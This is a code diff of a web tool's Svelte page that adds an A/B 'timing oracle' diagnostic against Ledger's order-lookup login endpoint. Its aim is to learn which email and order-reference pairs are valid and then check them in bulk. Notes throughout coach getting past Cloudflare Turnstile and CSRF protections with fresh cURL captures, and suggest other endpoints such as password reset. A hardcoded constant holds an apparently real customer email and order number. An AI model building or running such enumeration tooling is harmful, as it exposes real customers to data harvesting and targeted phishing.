@@ -71,6 +71,94 @@
 
 	const DIAGNOSTIC = { email: 'ooyeleye0@gmail.com', orderRef: 'LDG3530088' };
 
+	let hasSingleUseTokens = $derived(
+		/cf-turnstile-response|_token\]/.test(overrideBody) ||
+		/cf-turnstile-response|_token\]/.test(config?.probeUrl || '')
+	);
+
+	// A/B diagnostic state
+	let abCurlA = $state('');
+	let abCurlB = $state('');
+	let abResultA = $state<{ elapsedMs: number; httpStatus: number; error?: string } | null>(null);
+	let abResultB = $state<{ elapsedMs: number; httpStatus: number; error?: string } | null>(null);
+	let abRunningA = $state(false);
+	let abRunningB = $state(false);
+	let showAbDiag = $state(false);
+
+	async function runAbProbe(curl: string, slot: 'A' | 'B') {
+		if (slot === 'A') { abRunningA = true; abResultA = null; }
+		else { abRunningB = true; abResultB = null; }
+		try {
+			const parseRes = await fetch('/api/order-checker/import-curl', {
+				method: 'POST',
+				headers: { 'Content-Type': 'application/json' },
+				body: JSON.stringify({ curl, sampleEmail: '', sampleOrderRef: '' })
+			});
+			if (!parseRes.ok) throw new Error(`Parse failed: HTTP ${parseRes.status}`);
+			const parsed = await parseRes.json();
+			if (!parsed.probeUrl) throw new Error('Could not extract URL from cURL');
+
+			const probeRes = await fetch('/api/order-checker', {
+				method: 'POST',
+				headers: { 'Content-Type': 'application/json' },
+				body: JSON.stringify({
+					pairs: [{ email: 'diagnostic@probe.test', orderRef: 'DIAG000000' }],
+					threshold: 0,
+					concurrency: 1,
+					runs: 1,
+					mode: 'pair',
+					probeUrl: parsed.probeUrl,
+					method: parsed.method,
+					bodyTemplate: parsed.bodyTemplate,
+					headers: parsed.headers,
+					save: false
+				})
+			});
+			if (!probeRes.ok || !probeRes.body) throw new Error(`Probe failed: HTTP ${probeRes.status}`);
+
+			const reader = probeRes.body.getReader();
+			const decoder = new TextDecoder();
+			let buffer = '';
+			let result: { elapsedMs: number; httpStatus: number; error?: string } | null = null;
+			while (true) {
+				const { done, value } = await reader.read();
+				if (done) break;
+				buffer += decoder.decode(value, { stream: true });
+				let nl: number;
+				while ((nl = buffer.indexOf('\n')) !== -1) {
+					const line = buffer.slice(0, nl).trim();
+					buffer = buffer.slice(nl + 1);
+					if (!line) continue;
+					try {
+						const ev = JSON.parse(line);
+						if (ev.type === 'result' && ev.result) {
+							result = { elapsedMs: ev.result.elapsedMs, httpStatus: ev.result.httpStatus, error: ev.result.error };
+						}
+					} catch {}
+				}
+			}
+			if (slot === 'A') abResultA = result;
+			else abResultB = result;
+		} catch (err: any) {
+			const msg = err?.message || 'failed';
+			if (slot === 'A') abResultA = { elapsedMs: 0, httpStatus: 0, error: msg };
+			else abResultB = { elapsedMs: 0, httpStatus: 0, error: msg };
+			toast.error(msg);
+		} finally {
+			if (slot === 'A') abRunningA = false;
+			else abRunningB = false;
+		}
+	}
+
+	let abVerdict = $derived.by(() => {
+		if (!abResultA || !abResultB) return null;
+		if (abResultA.error || abResultB.error) return 'error';
+		const diff = Math.abs(abResultA.elapsedMs - abResultB.elapsedMs);
+		const max = Math.max(abResultA.elapsedMs, abResultB.elapsedMs);
+		if (diff > 200 && diff > max * 0.3) return 'viable';
+		return 'inconclusive';
+	});
+
 	let results: ProbeResult[] = $state([]);
 	let summary: BatchSummary | null = $state(null);
 	let running = $state(false);
@@ -453,6 +541,113 @@
 			</div>
 		{/if}
 	</div>
+
+	{#if hasSingleUseTokens}
+		<div class="rounded-xl border border-amber-500/30 bg-amber-500/10 p-4 text-xs leading-relaxed text-amber-200">
+			<div class="flex items-start gap-2">
+				<AlertTriangle size={14} class="mt-0.5 shrink-0" />
+				<div>
+					<strong>Single-use tokens detected in body template.</strong>
+					Cloudflare Turnstile and Symfony CSRF tokens are one-time-use. Each cURL capture is good for
+					<strong>exactly one probe</strong>. Re-running the same body will get a fast rejection that doesn't
+					reflect the real timing oracle. Use the <button type="button" class="underline font-semibold" onclick={() => (showAbDiag = true)}>A/B Diagnostic</button> below with two fresh cURL captures to test if the timing oracle is viable.
+				</div>
+			</div>
+		</div>
+	{/if}
+
+	{#if showAbDiag}
+		<div class="rounded-xl border border-[var(--border)] bg-[var(--card)] p-5">
+			<div class="mb-3 flex items-center justify-between">
+				<h2 class="text-sm font-semibold text-[var(--foreground)]">A/B Diagnostic — Single-probe comparison</h2>
+				<button type="button" onclick={() => (showAbDiag = false)} class="rounded-md p-1 text-[var(--muted-foreground)] transition-soft hover:bg-[var(--accent)]">
+					<Square size={12} />
+				</button>
+			</div>
+			<p class="mb-4 text-[11px] text-[var(--muted-foreground)] leading-relaxed">
+				Paste two fresh cURL captures — one with a <strong>known-valid</strong> pair, one with a <strong>known-invalid</strong> pair.
+				Each is fired once. Compare the elapsed times to see if the timing oracle leaks information.
+			</p>
+			<div class="grid gap-4 md:grid-cols-2">
+				<div>
+					<label class="mb-1 block text-[10px] font-semibold uppercase tracking-wider text-[var(--muted-foreground)]">
+						Probe A — known-valid pair
+					</label>
+					<textarea
+						bind:value={abCurlA}
+						rows="3"
+						spellcheck="false"
+						placeholder="curl 'https://my-order.ledger.com/login' ..."
+						class="w-full rounded-md border border-[var(--border)] bg-[var(--input)] px-3 py-2 font-mono text-[11px] text-[var(--foreground)] focus:border-[var(--accent-primary)] focus:outline-none"
+					></textarea>
+					<button
+						type="button"
+						onclick={() => runAbProbe(abCurlA, 'A')}
+						disabled={abRunningA || !abCurlA.trim()}
+						class="mt-2 flex items-center gap-1.5 rounded-md border border-[var(--border)] px-3 py-1.5 text-[11px] text-[var(--muted-foreground)] transition-soft hover:bg-[var(--accent)] hover:text-[var(--foreground)] disabled:opacity-50"
+					>
+						{#if abRunningA}<Loader2 size={11} class="animate-spin" />{:else}<Play size={11} />{/if}
+						Fire probe A
+					</button>
+					{#if abResultA}
+						<div class="mt-2 rounded-md border border-[var(--border)] bg-[var(--input)]/30 px-3 py-2 font-mono text-xs">
+							{#if abResultA.error}
+								<span class="text-amber-300">Error: {abResultA.error}</span>
+							{:else}
+								<span class="text-emerald-300">{abResultA.elapsedMs}ms</span> · HTTP {abResultA.httpStatus}
+							{/if}
+						</div>
+					{/if}
+				</div>
+				<div>
+					<label class="mb-1 block text-[10px] font-semibold uppercase tracking-wider text-[var(--muted-foreground)]">
+						Probe B — known-invalid pair
+					</label>
+					<textarea
+						bind:value={abCurlB}
+						rows="3"
+						spellcheck="false"
+						placeholder="curl 'https://my-order.ledger.com/login' ... (different pair)"
+						class="w-full rounded-md border border-[var(--border)] bg-[var(--input)] px-3 py-2 font-mono text-[11px] text-[var(--foreground)] focus:border-[var(--accent-primary)] focus:outline-none"
+					></textarea>
+					<button
+						type="button"
+						onclick={() => runAbProbe(abCurlB, 'B')}
+						disabled={abRunningB || !abCurlB.trim()}
+						class="mt-2 flex items-center gap-1.5 rounded-md border border-[var(--border)] px-3 py-1.5 text-[11px] text-[var(--muted-foreground)] transition-soft hover:bg-[var(--accent)] hover:text-[var(--foreground)] disabled:opacity-50"
+					>
+						{#if abRunningB}<Loader2 size={11} class="animate-spin" />{:else}<Play size={11} />{/if}
+						Fire probe B
+					</button>
+					{#if abResultB}
+						<div class="mt-2 rounded-md border border-[var(--border)] bg-[var(--input)]/30 px-3 py-2 font-mono text-xs">
+							{#if abResultB.error}
+								<span class="text-amber-300">Error: {abResultB.error}</span>
+							{:else}
+								<span class="text-[var(--muted-foreground)]">{abResultB.elapsedMs}ms</span> · HTTP {abResultB.httpStatus}
+							{/if}
+						</div>
+					{/if}
+				</div>
+			</div>
+			{#if abVerdict}
+				<div class="mt-4 rounded-md border p-3 text-xs leading-relaxed {abVerdict === 'viable' ? 'border-emerald-500/30 bg-emerald-500/10 text-emerald-200' : abVerdict === 'error' ? 'border-amber-500/30 bg-amber-500/10 text-amber-200' : 'border-[var(--border)] bg-[var(--input)]/30 text-[var(--muted-foreground)]'}">
+					{#if abVerdict === 'viable'}
+						<strong>Timing oracle looks viable.</strong>
+						A = {abResultA?.elapsedMs}ms, B = {abResultB?.elapsedMs}ms (delta: {Math.abs((abResultA?.elapsedMs ?? 0) - (abResultB?.elapsedMs ?? 0))}ms).
+						The valid pair took measurably longer, suggesting a DB hit. You can proceed with batch checking — but each probe needs a fresh cURL capture with valid Turnstile + CSRF tokens.
+					{:else if abVerdict === 'error'}
+						<strong>One or both probes errored.</strong>
+						Token may have been burned, cf_clearance expired, or the session cookie is invalid. Re-capture both cURLs from a fresh page load.
+					{:else}
+						<strong>Inconclusive.</strong>
+						A = {abResultA?.elapsedMs}ms, B = {abResultB?.elapsedMs}ms (delta: {Math.abs((abResultA?.elapsedMs ?? 0) - (abResultB?.elapsedMs ?? 0))}ms).
+						The timing difference is too small to distinguish valid from invalid. Ledger may short-circuit at Turnstile/CSRF before the DB check. Consider a different endpoint (parcel tracking, password reset flow).
+					{/if}
+				</div>
+			{/if}
+		</div>
+	{/if}
 
 	<div class="grid gap-5 xl:grid-cols-3">
 		<div class="xl:col-span-2 space-y-4">
@@ -851,12 +1046,19 @@
 				</p>
 				<div class="mt-3 rounded-md border border-amber-500/30 bg-amber-500/10 p-3 text-[11px] leading-relaxed text-amber-200">
 					<strong class="block">Ledger note:</strong>
-					<code class="font-mono">my-order.ledger.com</code> is behind Cloudflare Managed Challenge.
-					GET requests get blocked, but POSTs with the right Origin/Referer pass through to the
-					real Symfony backend. The exact API path isn't published — open the login page in your
-					browser, submit a real pair with DevTools open, then <strong>Copy as cURL</strong> from
-					the Network tab and paste it into the Advanced panel. The panel auto-fills the URL,
-					method, headers, and body template.
+					<code class="font-mono">my-order.ledger.com</code> is behind Cloudflare Managed Challenge with
+					<strong>Turnstile</strong> (anti-bot) and <strong>Symfony CSRF</strong> tokens. Both are
+					<strong>single-use</strong> — each captured cURL is good for exactly one probe. The second
+					use gets a fast 403/400 before Ledger touches its order database, so timing won't leak
+					anything on reuse.
+				</div>
+				<div class="mt-2 rounded-md border border-[var(--border)] bg-[var(--input)]/30 p-3 text-[11px] leading-relaxed">
+					<strong class="block text-[var(--foreground)]">How to test:</strong>
+					Use the <strong>A/B Diagnostic</strong> above. Capture two fresh cURLs from DevTools (one
+					with a known-valid pair, one with a known-invalid pair). Fire each once and compare the
+					elapsed times. A large gap (valid &gt; 200ms slower) means the timing oracle works. If
+					both are similar, Ledger rejects at the token layer before the DB and this endpoint isn't
+					viable for bulk checking.
 				</div>
 			</div>
 		</div>
